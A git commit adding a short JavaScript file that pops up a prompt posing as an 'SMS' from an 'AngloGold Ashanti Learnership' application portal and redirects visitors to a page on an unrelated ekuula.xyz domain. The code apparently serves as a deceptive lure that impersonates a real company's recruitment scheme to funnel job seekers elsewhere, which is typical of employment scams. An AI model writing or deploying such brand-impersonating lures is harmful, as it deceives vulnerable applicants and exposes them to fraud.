4a73669e61981728a08aa301c7a65be54752bdd8
bigetijazz28 <bigetijazz28@gmail.com>
2025-09-08 08:55:28 +0100

    Create zaashanti.js

---
+++ zaashanti.js
@@ -0,0 +1,6 @@
+
+var password = 'APPLY NOW'
+password=prompt('SMS: Welcome To AngloGold Ashanti Learnership Applicaion Portal, Kindly Press OK to PROCEED','APPLY NOW');
+if (password != 'APPLY NOW') {
+location.href='https://www.ekuula.xyz/Anglogold-Ashanti-Learnerships';
+}
